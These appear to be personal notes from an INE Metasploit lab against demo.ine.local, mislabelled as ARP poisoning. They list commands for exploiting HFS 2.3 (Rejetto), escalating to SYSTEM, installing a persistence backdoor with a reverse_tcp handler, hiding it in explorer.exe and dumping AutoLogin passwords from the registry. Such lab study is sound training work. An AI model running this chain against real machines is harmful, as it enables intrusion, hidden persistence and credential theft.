ARP Poisoning/Spoofing

## Metasploit


Lab
first

1.  Identify available services on the target
	1. nmap -A -O -p 80 demo.ine.local
			-A scans using all scripts
			-O check OS 
    
2.  Find vulnerability of the target application
    searchsploit hfs 2.3
		-check if exploits exists
	 msfconsole ....  search the exploit (this case rejetto)
	 
3.  Exploit the target using Metasploit Framework
    use (exploit id)
	 show options and set options (make sure LHOST and the modules SRVHOSTS same but port different so that the module the port connects from(SRVPORT) is not same as the payload port (LPORT). 
	 exploit
	 
4.  Obtain SYSTEM privileges on the machine
	1. sessions -> to check available sessions
	2. sessions (session id ) -> to run sesison
	3. In the meterpreter shell:
		1. getsystem --> receive sytem priveldge ...metasploits PEA
		2. getuid --> double check ur priveledge
    
5.  Install Persistence backdoor
	1. use "background" to close the prev session
	2. use exploit/windows/local/persistence_service
	3. set the session to install the backdoor
	4. exploit
	5. background the new session opened
	6. use exploit/multi/handler --> generic handler to listen for the backdoor installed (starts when the backdoor service tries to connect every 5 seconds)
	7. set PAYLOAD windows/meterpreter/reverse_tcp --> the prev payload used
	8. set LHOST LPORT etc then exploit
	9. migrate -N explorer.exe --> good practice to hide ur backdoor as a common explorer.exe service
6.  Extract AutoLogin credentials
	1. use post/windows/gather/credentials/windows_autologin
	2. set session (watever)
	3. exploit
	4. Â password of AutoLogin was stored in the registry in plain-text format. Hence, we were able to dump it
	5. These registries are used to auto login to the windows machine (First-time boot or restart) without entering the username and password.
